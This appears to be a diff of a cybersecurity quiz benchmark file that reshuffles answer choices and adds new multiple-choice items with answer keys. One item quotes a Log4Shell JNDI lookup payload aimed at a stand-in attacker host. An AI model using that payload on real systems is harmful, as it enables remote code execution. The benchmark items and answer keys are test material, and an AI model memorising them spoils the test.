     "dimension": "SA",
     "question": "What is the principle of fail-safe defaults?",
     "choices": [
-      "Default deny access",
+      "Auto-restart on failure",
       "Default allow access",
-      "Fail silently",
-      "Auto-restart on failure"
+      "Default deny access",
+      "Fail silently"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 2
   },
   {
@@ -2514,9 +2514,9 @@
     "question": "IDS vs IPS difference?",
     "choices": [
       "IDS detects, IPS prevents",
-      "IDS is internal, IPS is perimeter",
+      "No real difference",
       "IDS uses signatures, IPS uses AI",
-      "No real difference"
+      "IDS is internal, IPS is perimeter"
     ],
     "correct": 0,
     "difficulty": 2
@@ -2526,12 +2526,12 @@
     "dimension": "SA",
     "question": "What is a bastion host?",
     "choices": [
-      "Hardened server exposed to untrusted network",
       "Internal server",
+      "DNS server",
       "Load balancer",
-      "DNS server"
+      "Hardened server exposed to untrusted network"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 2
   },
   {
@@ -2539,12 +2539,12 @@
     "dimension": "SA",
     "question": "SOAR architecture includes?",
     "choices": [
-      "Orchestration, automation, response workflows",
-      "Security operations and reporting",
       "System optimization and recovery",
-      "Software operations and reliability"
+      "Software operations and reliability",
+      "Security operations and reporting",
+      "Orchestration, automation, response workflows"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 3
   },
   {
@@ -2552,12 +2552,12 @@
     "dimension": "SA",
     "question": "What is least functionality principle?",
     "choices": [
-      "Configure systems with minimal services",
       "Use fewest number of servers",
+      "Use cheapest tools",
       "Hire minimum staff",
-      "Use cheapest tools"
+      "Configure systems with minimal services"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 2
   },
   {
@@ -2565,12 +2565,12 @@
     "dimension": "SA",
     "question": "What is a honeypot?",
     "choices": [
-      "Decoy system to attract attackers",
       "Sweet spot in network design",
+      "Decoy system to attract attackers",
       "Centralized logging server",
       "Backup system"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 1
   },
   {
@@ -2578,12 +2578,12 @@
     "dimension": "SA",
     "question": "Security information flow in enterprise typically follows?",
     "choices": [
+      "Firewall -> IDS -> WAF",
       "SOC -> SIEM -> Incident Response",
-      "CEO -> IT -> Users",
       "Users -> Helpdesk -> Developers",
-      "Firewall -> IDS -> WAF"
+      "CEO -> IT -> Users"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 3
   },
   {
@@ -2591,12 +2591,12 @@
     "dimension": "SA",
     "question": "What is data loss prevention (DLP)?",
     "choices": [
-      "Preventing unauthorized data exfiltration",
-      "Data backup solution",
       "Data compression tool",
-      "Disaster recovery plan"
+      "Disaster recovery plan",
+      "Data backup solution",
+      "Preventing unauthorized data exfiltration"
     ],
-    "correct": 0,
+    "correct": 3,
     "difficulty": 2
   },
   {
@@ -2617,12 +2617,12 @@
     "dimension": "SA",
     "question": "What is security orchestration?",
     "choices": [
-      "Coordinating security tools and processes",
-      "Musical security metaphor",
       "Physical security arrangement",
-      "Organizing security team"
+      "Coordinating security tools and processes",
+      "Organizing security team",
+      "Musical security metaphor"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 2
   },
   {
@@ -2630,12 +2630,12 @@
     "dimension": "SA",
     "question": "API gateway security includes?",
     "choices": [
-      "Authentication, rate limiting, input validation",
-      "API documentation",
+      "Load testing",
       "API design",
-      "Load testing"
+      "Authentication, rate limiting, input validation",
+      "API documentation"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 2
   },
   {
@@ -2643,12 +2643,12 @@
     "dimension": "SA",
     "question": "What is a reverse proxy?",
     "choices": [
-      "Server-side proxy hiding backend servers",
       "Client-side proxy",
+      "Server-side proxy hiding backend servers",
       "Backwards compatible proxy",
       "Proxy that reverses traffic"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 2
   },
   {
@@ -2670,9 +2670,9 @@
     "question": "What is service mesh security?",
     "choices": [
       "mTLS and policy enforcement between microservices",
-      "Physical security mesh network",
       "WiFi mesh security",
-      "Service-level agreement security"
+      "Service-level agreement security",
+      "Physical security mesh network"
     ],
     "correct": 0,
     "difficulty": 4
@@ -2682,12 +2682,12 @@
     "dimension": "SA",
     "question": "IAM federation enables?",
     "choices": [
-      "Single identity across multiple systems",
       "Network federation",
       "Server clustering",
+      "Single identity across multiple systems",
       "Database replication"
     ],
-    "correct": 0,
+    "correct": 2,
     "difficulty": 3
   },
   {
@@ -2695,12 +2695,12 @@
     "dimension": "SA",
     "question": "What is a security control plane?",
     "choices": [
+      "Network control protocol",
       "Centralized security policy management",
       "Physical control room",
-      "Network control protocol",
       "CPU security features"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 4
   },
   {
@@ -2708,12 +2708,12 @@
     "dimension": "SA",
     "question": "What is runtime application self-protection (RASP)?",
     "choices": [
-      "Security built into running application",
-      "Rapid security patching",
       "Remote application scanning",
-      "Real-time anti-spam protection"
+      "Security built into running application",
+      "Real-time anti-spam protection",
+      "Rapid security patching"
     ],
-    "correct": 0,
+    "correct": 1,
     "difficulty": 4
   },
   {
@@ -2721,12 +2721,532 @@
     "dimension": "SA",
     "question": "What is confidential computing?",
     "choices": [
-      "Processing data in hardware-encrypted enclaves",
-      "Keeping source code secret",
       "Using private networks",
+      "Keeping source code secret",
+      "Processing data in hardware-encrypted enclaves",
       "Encrypting emails"
+    ],
+    "correct": 2,
+    "difficulty": 4
+  },
+  {
+    "id": "VK-210",
+    "dimension": "VK",
+    "question": "Under CVSS v3.1 base metrics, which metric combination produces a base score of exactly 10.0?",
+    "choices": [
+      "AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+      "AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H",
+      "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
+    ],
+    "correct": 3,
+    "difficulty": 4
+  },
+  {
+    "id": "VK-211",
+    "dimension": "VK",
+    "question": "An API gateway validates a JSON request against a schema that rejects a dangerous field, but the backend application's parser reads the first occurrence of a duplicated key while the gateway validated the second. Which vulnerability class does this exploit?",
+    "choices": [
+      "SQL injection",
+      "Open redirect",
+      "Duplicate-key parsing inconsistency (JSON deserialization discrepancy)",
+      "HTTP request smuggling"
+    ],
+    "correct": 2,
+    "difficulty": 4
+  },
+  {
+    "id": "VK-212",
+    "dimension": "VK",
+    "question": "A tester sends ${jndi:ldap://attacker.example/x} as user-controlled input to a Java application running Log4j 2.14.1. In which configuration does the lookup NOT trigger an outbound connection?",
+    "choices": [
+      "The application sets log4j2.formatMsgNoLookups=true",
+      "The JVM runs on Java 8u191 or later",
+      "The input is placed in the ThreadContext map",
+      "The logger level is set to ERROR"
     ],
     "correct": 0,
     "difficulty": 4
+  },
+  {
+    "id": "VK-213",
+    "dimension": "VK",
+    "question": "A 64-bit Linux binary has a strcpy() stack buffer overflow. The binary was compiled with ASLR and NX enabled but WITHOUT a stack canary. Which of the following is still required for reliable arbitrary code execution?",
+    "choices": [
+      "Recompiling the binary",
+      "A memory leak disclosing a code pointer to defeat ASLR",
+      "A separate stack-canary bypass",
+      "Disabling SELinux at runtime"
+    ],
+    "correct": 1,
+    "difficulty": 4
+  },
+  {
+    "id": "VK-214",
+    "dimension": "VK",
+    "question": "In a Spectre-v1 (bounds check bypass) attack, why must the attacker use a covert channel such as cache timing to learn the speculatively read secret?",
+    "choices": [
+      "The CPU purges all cache lines whenever a misprediction occurs",
+      "The secret is stored encrypted in physical memory",
+      "Branch predictors ignore indirect branches",
+      "Speculative results are architecturally rolled back, so the secret never reaches registers or memory; only microarchitectural traces persist"
+    ],
+    "correct": 3,
+    "difficulty": 5
+  },
+  {
+    "id": "TI-215",
+    "dimension": "TI",
+    "question": "According to MITRE ATT&CK, which technique-sub-technique pairing is INCORRECT?",
+    "choices": [
+      "T1055 Process Injection -> T1055.009 Process Doppelganging",
+      "T1059 Command and Scripting Interpreter -> T1059.001 PowerShell",
+      "T1003 OS Credential Dumping -> T1003.002 Security Account Manager",
+      "T1566 Phishing -> T1566.002 Spearphishing Link"
+    ],
+    "correct": 0,
+    "difficulty": 4
+  },
+  {
+    "id": "TI-216",
+    "dimension": "TI",
+    "question": "An analyst observes a host sending SMB SESSION_SETUP requests with NTLMSSP negotiation to dozens of internal servers in rapid succession, with no follow-up file operations. Which adversary behavior is most consistent with this traffic?",
+    "choices": [
+      "Credential harvesting / NTLM relay scanning",
+      "WMI-based remote command execution",
+      "DNS tunneling exfiltration",
+      "RDP password brute forcing"
+    ],
+    "correct": 0,
+    "difficulty": 4
+  },
+  {
+    "id": "TI-217",
+    "dimension": "TI",
+    "question": "Which statement about the Diamond Model of Intrusion Analysis is correct?",
+    "choices": [
+      "It replaces MITRE ATT&CK for technique mapping",
+      "Its four core features are adversary, capability, infrastructure, and victim",
+      "It defines seven sequential phases like the Cyber Kill Chain",
+      "It can only be applied when full packet captures are available"
+    ],
+    "correct": 1,
+    "difficulty": 4
+  },
+  {
+    "id": "TI-218",
+    "dimension": "TI",
+    "question": "Which best explains why threat intelligence programs prefer sharing TTPs over raw IOCs?",
+    "choices": [
+      "IOCs cannot be represented in structured formats",
+      "TTPs describe adversary behavior and remain valid after infrastructure changes; IOCs are perishable",
+      "Sharing IOCs requires legal clearance in all jurisdictions",
+      "TTPs are always machine-readable without context"
+    ],
+    "correct": 1,
+    "difficulty": 4
+  },
+  {
+    "id": "TI-219",
+    "dimension": "TI",
+    "question": "A vendor report attributes an intrusion to a named nation-state APT group based primarily on overlapping C2 domains, a common malware family, and the target industry. Which analytic concern is most significant for this attribution?",
+    "choices": [
+      "False attribution driven by commodity tooling and shared infrastructure used by multiple groups",
+      "Selection bias from honeypot data",
+      "Rounding error in timestamps",
+      "Survivorship bias in victim telemetry"
+    ],
+    "correct": 0,
+    "difficulty": 5
+  },
+  {
+    "id": "SC-220",
+    "dimension": "SC",
+    "question": "A web app renders untrusted input inside a JavaScript template literal within an inline <script> block. Which mitigation reliably prevents script injection in this context?",
+    "choices": [
+      "Adding CSP script-src 'self' while keeping 'unsafe-inline' enabled so the existing inline script still runs",
+      "HTML entity encoding of the input",
+      "URL-encoding the input",
+      "Escaping for the JavaScript string context (backslash-escaping quotes/backslashes, or JSON.stringify)"
+    ],
+    "correct": 3,
+    "difficulty": 4
+  },
+  {
+    "id": "SC-221",
+    "dimension": "SC",
+    "question": "An application logs full HTTP request bodies to a central log store readable by application-support staff; a login request containing a password is therefore visible to them. Which CWE class does this primarily fall under?",
+    "choices": [
+      "CWE-532 Insertion of Sensitive Information into Log File",
+      "CWE-601 Open Redirect",
+      "CWE-89 SQL Injection",
+      "CWE-352 Cross-Site Request Forgery"
+    ],
+    "correct": 0,
+    "difficulty": 4
+  },
+  {
+    "id": "SC-222",
+    "dimension": "SC",
+    "question": "Which sequence correctly validates an RS256 JWT received at an API?",
+    "choices": [
+      "Skip signature verification whenever the alg header is HS256, because HMAC keys are symmetric",
+      "Validate exp/nbf/iss/aud first, and verify the signature only if those claims look suspicious",
+      "Trust the kid claim and use the public key embedded in the token itself",
+      "Parse the header; retrieve the signing key from the issuer's JWKS using kid and alg; verify the signature; then validate exp/nbf/iss/aud claims"
+    ],
+    "correct": 3,
+    "difficulty": 4
+  },
+  {
+    "id": "SC-223",
+    "dimension": "SC",
+    "question": "An attacker notices that a CDN's cache key for /profile includes the URL path but ignores the Host header and query string, and that an unkeyed header X-Forwarded-Host is reflected in the response body. Which attack does this enable?",
+    "choices": [
+      "Web cache poisoning",
+      "HTTP response splitting",
+      "DNS rebinding",
+      "Cache busting"
+    ],
+    "correct": 0,
+    "difficulty": 4
+  },
+  {
+    "id": "SC-224",
+    "dimension": "SC",
+    "question": "A Java application accepts a serialized object inside a cookie and deserializes it to restore session state. Which CWE most directly classifies this pattern?",
+    "choices": [
+      "CWE-502 Deserialization of Untrusted Data",
+      "CWE-798 Use of Hard-coded Credentials",
+      "CWE-352 Cross-Site Request Forgery",
+      "CWE-79 Cross-Site Scripting"
+    ],
+    "correct": 0,
+    "difficulty": 4
+  },
+  {
+    "id": "SC-225",
+    "dimension": "SC",
+    "question": "In the OAuth 2.0 authorization code flow, which parameter binds the authorization request to the user's browser session and mitigates CSRF / authorization-code injection?",
+    "choices": [
+      "The scope parameter",
+      "The PKCE code_verifier",
+      "The state parameter",
+      "The nonce parameter"
+    ],
+    "correct": 2,
+    "difficulty": 4
+  },
+  {
+    "id": "SC-226",
+    "dimension": "SC",
+    "question": "Why is HTML entity encoding insufficient to prevent XSS when untrusted data is placed inside an UNQUOTED attribute value?",
+    "choices": [
+      "Entities are decoded before attribute parsing, so an encoded space (&#32;) becomes a delimiter and an attacker can inject a new attribute such as onmouseover",
+      "CSP blocks entity decoding",
+      "Unquoted attributes are ignored by browsers",
+      "Browsers do not decode entities inside attribute values"
+    ],
+    "correct": 0,
+    "difficulty": 5
+  },
+  {
+    "id": "SC-227",
+    "dimension": "SC",
+    "question": "Why does a naive byte-by-byte == comparison of a received MAC against the expected MAC enable forgery, and what is the standard fix?",
+    "choices": [
+      "The fix is to compare MACs only after decrypting the message",
+      "Timing leaks only exist over the network, so local comparisons are safe",
+      "The comparison truncates the MAC to 32 bits",
+      "Early exit on the first differing byte leaks the length of the correct prefix through timing, enabling byte-at-a-time guessing; use a constant-time comparison such as hmac.compare_digest"
+    ],
+    "correct": 3,
+    "difficulty": 5
+  },
+  {
+    "id": "IR-228",
+    "dimension": "IR",
+    "question": "Per the RFC 3227 order-of-volatility guidance, which evidence should be collected FIRST from a live system suspected of compromise?",
+    "choices": [
+      "Firewall and router logs",
+      "Backup tapes",
+      "Contents of memory (RAM) and register state",
+      "A full image of the hard disk"
+    ],
+    "correct": 2,
+    "difficulty": 4
+  },
+  {
+    "id": "IR-229",
+    "dimension": "IR",
+    "question": "During a Windows host investigation of a phishing-delivered document, which artifact most reliably indicates when the malicious document was FIRST opened?",
+    "choices": [
+      "The MFT entry's last modification time for the document",
+      "The creation time of the Recent Items .lnk shortcut pointing to the document",
+      "The System Restore point creation time",
+      "The Event ID 4624 logon time"
+    ],
+    "correct": 1,
+    "difficulty": 4
+  },
+  {
+    "id": "IR-230",
+    "dimension": "IR",
+    "question": "Ransomware is actively encrypting network file shares from a single domain-joined workstation. Which containment action is the BEST immediate step?",
+    "choices": [
+      "Reimage the workstation immediately",
+      "Isolate the host at the network/EDR level while preserving power and memory for evidence collection",
+      "Restore affected shares from backup before containing the host",
+      "Power off the host immediately"
+    ],
+    "correct": 1,
+    "difficulty": 4
+  },
+  {
+    "id": "IR-231",
+    "dimension": "IR",
+    "question": "Which Windows Security event log ID indicates that the audit log was cleared?",
+    "choices": [
+      "1102",
+      "7045",
+      "4624",
+      "4688"
+    ],
+    "correct": 0,
+    "difficulty": 4
+  },
+  {
+    "id": "IR-232",
+    "dimension": "IR",
+    "question": "A compromised web server receives web-shell commands from an attacker whose traffic arrives via a CDN. Which evidence source best reveals the attacker's true origin?",
+    "choices": [
+      "The X-Forwarded-For header in application logs",
+      "The User-Agent string",
+      "The CDN provider's request logs for the period in question",
+      "NetFlow records of the CDN edge node's connection to the origin"
+    ],
+    "correct": 2,
+    "difficulty": 5
+  },
+  {
+    "id": "CG-233",
+    "dimension": "CG",
+    "question": "Under GDPR, when a data processor discovers a personal data breach, what is the deadline for notifying the data controller?",
+    "choices": [
+      "Within 24 hours",
+      "Within 30 days",
+      "Within 72 hours",
+      "Without undue delay"
+    ],
+    "correct": 3,
+    "difficulty": 4
+  },
+  {
+    "id": "CG-234",
+    "dimension": "CG",
+    "question": "In NIST CSF 2.0, which function contains the ID.AM (Asset Management) category?",
+    "choices": [
+      "Govern",
+      "Identify",
+      "Protect",
+      "Detect"
+    ],
+    "correct": 1,
+    "difficulty": 4
+  },
+  {
+    "id": "CG-235",
+    "dimension": "CG",
+    "question": "Under PCI DSS v4.0, how must stored primary account numbers (PAN) be protected?",
+    "choices": [
+      "Stored in plaintext as long as the database itself is encrypted at rest",
+      "Rendered unreadable (e.g., encryption, tokenization, or masking) wherever stored, with access restricted",
+      "Split across two separate databases",
+      "Deleted within 90 days of authorization"
+    ],
+    "correct": 1,
+    "difficulty": 4
+  },
+  {
+    "id": "CG-236",
+    "dimension": "CG",
+    "question": "An organization decides NOT to deploy antivirus on air-gapped PLC workstations. Under ISO/IEC 27001:2022, what is required for this decision to be compliant?",
+    "choices": [
+      "The control is mandatory; no exception is possible",
+      "A documented risk treatment decision with formal risk acceptance, justified and approved by the risk owner",
+      "Antivirus is never required if the network is air-gapped",
+      "Listing control A.8.7 as 'not applicable' in the statement of applicability without further justification"
+    ],
+    "correct": 1,
+    "difficulty": 4
+  },
+  {
+    "id": "CG-237",
+    "dimension": "CG",
+    "question": "A cloud service provider acting as a business associate (BA) under HIPAA suffers a breach of protected health information (PHI) it processes for a covered entity. Which statement is correct?",
+    "choices": [
+      "The BA must notify the covered entity (no later than 60 days after discovery), and the covered entity is responsible for notification to individuals and HHS",
+      "The BA must notify HHS and affected individuals directly",
+      "Neither party notifies if the breach was caused by a nation-state actor",
+      "Both parties notify HHS, and HHS decides which notification is authoritative"
+    ],
+    "correct": 0,
+    "difficulty": 5
+  },
+  {
+    "id": "FA-238",
+    "dimension": "FA",
+    "question": "Which Windows artifact records the last execution time of an application even if the executable has since been deleted?",
+    "choices": [
+      "pagefile.sys",
+      "The NTFS $LogFile",
+      "Prefetch files (*.pf)",
+      "The SAM registry hive"
+    ],
+    "correct": 2,
+    "difficulty": 4
+  },
+  {
+    "id": "FA-239",
+    "dimension": "FA",
+    "question": "Why must a hardware write blocker be used when acquiring a forensic image of a suspect drive?",
+    "choices": [
+      "To mount the drive read-write for analysis",
+      "To decrypt BitLocker-encrypted volumes",
+      "To speed up the imaging process",
+      "To prevent the acquisition host's operating system from modifying the evidence, preserving its integrity for chain of custody"
+    ],
+    "correct": 3,
+    "difficulty": 4
+  },
+  {
+    "id": "FA-240",
+    "dimension": "FA",
+    "question": "Which macOS artifact retains application launch/usage timestamps across reboots and is commonly parsed in forensic investigations?",
+    "choices": [
+      "The knowledgeC database (knowledgeC.db)",
+      "The /etc/hosts file",
+      "The dyld shared cache",
+      "The kcpassword file"
+    ],
+    "correct": 0,
+    "difficulty": 4
+  },
+  {
+    "id": "FA-241",
+    "dimension": "FA",
+    "question": "In a Linux memory image, which structure would an analyst traverse to enumerate recently loaded kernel modules?",
+    "choices": [
+      "The ext4 superblock",
+      "The page tables",
+      "The linked list of struct module objects",
+      "The task_struct list"
+    ],
+    "correct": 2,
+    "difficulty": 4
+  },
+  {
+    "id": "FA-242",
+    "dimension": "FA",
+    "question": "Why does carving a JPEG from unallocated space using only its SOI (FFD8) and EOI (FFD9) markers often yield a truncated or corrupt image?",
+    "choices": [
+      "FFD9 can legitimately appear inside compressed image data or embedded thumbnails, so a naive EOI search cuts the file short",
+      "JPEG data in unallocated space is always XOR-encrypted",
+      "The file system journal re-encodes JPEG data",
+      "JPEG files are never aligned to sector boundaries"
+    ],
+    "correct": 0,
+    "difficulty": 5
+  },
+  {
+    "id": "FA-243",
+    "dimension": "FA",
+    "question": "In an NTFS MFT entry, the $STANDARD_INFORMATION creation time differs from the $FILE_NAME creation time (the latter is earlier and matches surrounding system activity). What is the most likely explanation?",
+    "choices": [
+      "The file was downloaded via a browser",
+      "NTFS compression artifacts",
+      "A clean system clock change",
+      "Timestomping - an anti-forensic manipulation that altered only $STANDARD_INFORMATION"
+    ],
+    "correct": 3,
+    "difficulty": 5
+  },
+  {
+    "id": "SA-244",
+    "dimension": "SA",
+    "question": "Which statement about TLS 1.3 cipher suites is correct?",
+    "choices": [
+      "TLS 1.3 removed server authentication entirely",
+      "RC4 remains available in TLS 1.3 when negotiated via legacy fallback",
+      "TLS 1.3 retains CBC-mode suites for backward compatibility",
+      "TLS 1.3 supports only AEAD cipher suites such as AES-GCM and ChaCha20-Poly1305"
+    ],
+    "correct": 3,
+    "difficulty": 4
+  },
+  {
+    "id": "SA-245",
+    "dimension": "SA",
+    "question": "Which statement best describes a Kerberos Golden Ticket attack?",
+    "choices": [
+      "The attacker requests a TGT without a password using AS-REP roasting",
+      "The attacker forges a TGT offline using the krbtgt account's hash, granting the ability to issue service tickets for long durations",
+      "The attacker captures a service ticket and replays it",
+      "The attacker brute-forces user passwords against the KDC"
+    ],
+    "correct": 1,
+    "difficulty": 4
+  },
+  {
+    "id": "SA-246",
+    "dimension": "SA",
+    "question": "What is the PRIMARY security benefit of network microsegmentation in a zero-trust architecture?",
+    "choices": [
+      "Limiting lateral movement by restricting east-west traffic between workloads",
+      "Eliminating the need for host-based firewalls",
+      "Preventing all phishing attempts",
+      "Encrypting all north-south traffic"
+    ],
+    "correct": 0,
+    "difficulty": 4
+  },
+  {
+    "id": "SA-247",
+    "dimension": "SA",
+    "question": "Which security boundary does a DNS rebinding attack primarily target?",
+    "choices": [
+      "The browser's same-origin policy, by making a domain resolve alternately to attacker-controlled and internal IP addresses",
+      "The cache of recursive DNS resolvers",
+      "TLS certificate validation",
+      "BGP route selection"
+    ],
+    "correct": 0,
+    "difficulty": 4
+  },
+  {
+    "id": "SA-248",
+    "dimension": "SA",
+    "question": "Why can certificate pinning still be defeated by an attacker performing TLS interception against an application running on a rooted device?",
+    "choices": [
+      "On a rooted device the verification environment itself is compromised: the attacker can hook or patch the application's pinning logic at runtime, or install a rogue CA into the system trust store",
+      "Pinned certificates are published in Certificate Transparency logs and therefore useless",
+      "TLS 1.3 removed support for pinning",
+      "Pinning only applies to browser traffic, not to mobile applications"
+    ],
+    "correct": 0,
+    "difficulty": 5
+  },
+  {
+    "id": "SA-249",
+    "dimension": "SA",
+    "question": "An architecture terminates TLS at a load balancer and forwards traffic to backend services. Which statement is most accurate?",
+    "choices": [
+      "Traffic between the load balancer and backends is plaintext unless re-encrypted (e.g., TLS re-origination or mTLS), so the internal link depends on network-layer trust",
+      "Backends cannot identify clients when TLS is terminated",
+      "The connection is end-to-end encrypted by definition",
+      "Terminating TLS at the load balancer satisfies zero-trust requirements without further measures"
+    ],
+    "correct": 0,
+    "difficulty": 5
   }
 ]
